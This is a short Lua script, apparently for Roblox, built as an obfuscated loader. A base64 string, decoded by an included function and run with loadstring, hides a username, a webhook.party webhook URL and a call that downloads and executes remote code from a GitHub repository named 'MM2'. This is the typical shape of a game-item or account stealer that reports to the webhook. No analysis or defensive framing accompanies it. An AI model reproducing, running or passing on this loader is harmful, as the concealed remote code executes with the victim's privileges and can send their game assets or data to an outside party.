
-- Obfuscated script
local encodedScript = "CnVzZXJOYW1lID0gIlF1b3RyZXkiCndlYkhvb2sgPSAiaHR0cHM6Ly9sLndlYmhvb2sucGFydHkvaG9vay83RXBLc3huaSUyQlp5Zk55b3NOVkZyTGxlSzBGTEhDZm5SWVJrV1l1bVFleTc4YzVzWUVLeVclMkJNb2VwRTZNRWxqMHdkS2E5eVo1V2hVUlhJODl5OUhwaU5SSHhQMGIxeDY3VjFVbTNDa3V1JTJGMDZoem9LWlZnRms2OXo0UktJOGFEWDd2bjlnTDcxbHNxZEExU3RpOTNCQkZFM0xpZCUyQlI4b0RBR0RhWXVQaFhMMTNFWE5FUU9rNUglMkY3TXdTVVMlMkZOcEMyVSUyQnVkSEtRcyUyRmt1elB2TWlQbE5XOVJNVDUlMkZPRjl3Unh6YmdUU3dQdGZjWjk0R3N5YWolMkJSeGlyS1pFNFpuV2M5Y2M5VHAzU0E5WDJkR2lVSkZ4Y0lqWFFWeUhUWjJzcGxYTyUyRkgyR1pOVnA3UXdXNm51WTMwVjNEWElFZFVSdWd2ZUJVWiUyRlQlMkJMNUp1TDZ0dnBYOGh4YjhGMzBLJTJGSHg0WWk3MXZjS3I3RDd6RFlPa2VrenR5b0x0VjFTZktuVnRFNER2WU11JTJGVTA0V2pWSVBkL29pQ0hkTjZ2Um9aQUo1QXYiCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vMjE0RWxpL01NMi4vcmVmcy9oZWFkcy9tYWluL01NMiIsIHRydWUpKSgp"

-- Decode function
local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Run the decoded script
loadstring(decode(encodedScript))()